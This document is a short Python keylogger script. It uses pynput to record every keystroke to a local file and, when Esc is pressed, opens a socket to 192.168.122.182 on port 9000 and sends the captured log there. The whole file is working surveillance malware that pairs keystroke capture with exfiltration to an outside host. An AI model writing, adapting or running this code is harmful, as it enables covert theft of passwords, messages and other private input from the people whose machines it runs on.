import pynput
from pynput import keyboard
import socket
def on_press(key):
    key_str = f'Key.{key.name}' if isinstance(key, keyboard.Key) else str(key)
    print(f'Key pressed: {key_str}')
    with open('keylogs.txt', 'a') as the_file:
        the_file.write(key_str + '\n')
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False
# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
print('Logging ended, sending data to server.')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect(('192.168.122.182', 9000))
    with open('keylogs.txt', 'rb') as the_file:
        file_data = the_file.read()
        print(f'Sending data: {file_data}')
        s.sendall(file_data)
except (ConnectionRefusedError, TimeoutError, socket.error) as e:
    print(f'An error occurred: {e}')
finally:
    s.close()
